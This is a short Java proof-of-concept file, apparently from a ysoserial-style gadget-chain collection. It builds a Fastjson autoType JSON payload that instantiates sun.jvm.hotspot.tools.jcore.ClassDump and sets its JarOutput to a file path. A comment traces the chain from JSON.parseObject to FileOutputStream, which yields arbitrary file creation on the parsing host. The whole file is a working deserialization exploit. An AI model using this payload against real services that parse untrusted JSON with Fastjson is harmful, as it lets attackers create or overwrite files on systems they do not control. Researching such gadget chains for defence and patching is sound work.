package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

/**
 * parseObject:197, JSON (com.alibaba.fastjson)
 * setJarOutput:70, ClassDump (sun.jvm.hotspot.tools.jcore)
 * <init>:101, FileOutputStream (java.io)
 */


public class Poc4 {
    public static void main(String[] args) throws Exception {
        String poc = "{\"@type\":\"sun.jvm.hotspot.tools.jcore.ClassDump\",\"JarOutput\":\"/tmp/test\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }

}
